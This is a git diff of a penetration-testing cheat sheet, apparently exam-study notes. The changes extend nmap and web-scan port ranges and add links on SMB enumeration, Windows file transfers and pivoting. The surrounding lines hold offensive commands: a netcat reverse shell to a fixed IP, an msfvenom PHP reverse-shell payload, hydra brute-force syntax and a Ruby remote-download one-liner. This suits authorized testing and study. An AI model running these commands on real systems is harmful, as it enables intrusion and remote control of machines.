@@ -73,7 +73,7 @@ nc.exe 192.168.100.113 4444 –e cmd.exe
 #quick scan
 sudo nmap -T4 -F x.x.x.x  
 #fullscan
-sudo nmap -sS -Pn -A x.x.x.x
+sudo nmap -sS -Pn -p- -A x.x.x.x
 #udp scan
 sudo nmap -sU -p- --max-retries 0 --min-rate 500 x.x.x.x  
 #output to file
@@ -127,7 +127,7 @@ hydra [-L users.txt or -l user_name] [-P pass.txt or -p password] -f [-S port] f
 nc $IP 22
 ```
 
-### Web scan (80 - http or 443 - https)
+### Web scan (80, 443, 8080, 8081, 8443, and 3000)
 ```bash
 #Nikto
 nikto -h x.x.x.x
@@ -219,6 +219,7 @@ echo exit | smbclient -L [IP]
 ```
 
 ### SMB commands
+- https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html#manual-inspection 
 ```bash
 smb> ls
 #download
@@ -1267,7 +1268,12 @@ msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
 | ruby -e ‘require “open-uri”;File.open(“output_file”, “wb”) do \|file\|;URI.open(“http://ip-addr:port/file”).read;end’	| Ruby Open-URI library |
 | echo -n “base64-output” > file	| Decoding the base64 output of the file |
 
+## Windows File Transfers with SMB
+- https://0xdf.gitlab.io/2018/10/11/pwk-notes-post-exploitation-windows-file-transfers.html
+- 
+
 ## Pivoting for lateral movement
+- https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html
 ### Using Chisel
 - https://blog.mkiesel.ch/posts/oscp_pivoting/
 - https://ap3x.github.io/posts/pivoting-with-chisel/ for multi level pivot
